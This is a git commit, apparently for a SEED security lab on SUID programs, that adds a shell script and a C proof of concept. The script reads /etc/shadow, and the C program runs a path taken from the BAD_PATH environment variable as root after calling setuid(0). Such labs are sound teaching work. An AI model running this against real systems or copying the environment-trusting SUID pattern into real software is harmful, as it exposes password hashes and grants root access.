d4e5b8b3889318f2a6ee172b0f7a657348a6e1c9
cappetta <thomas.cappetta@gmail.com>
2019-09-29 10:38:41 -0400

    seed: suid lab 1

---
+++ tutorials/seed/suid/malicious.sh
@@ -0,0 +1,3 @@
+/bin/sh -c whoami
+touch /tmp/z_mal
+cat /etc/shadow
---
+++ tutorials/seed/suid/poc.c
@@ -0,0 +1,20 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+int main(int argc, char **argv, char **env)
+{
+  int i=0;
+  char *cmd;while (env[i] != NULL)
+  {
+  if (!strcmp(strsep(&env[i],"="),"BAD_PATH"))
+  {
+    cmd=malloc(strlen(env[i])+20);
+    if (cmd==NULL) exit(1);
+    sprintf(cmd,"%s/malicious",env[i]);
+    setuid(0);
+    system(cmd);
+  }
+  i++;
+  }
+}
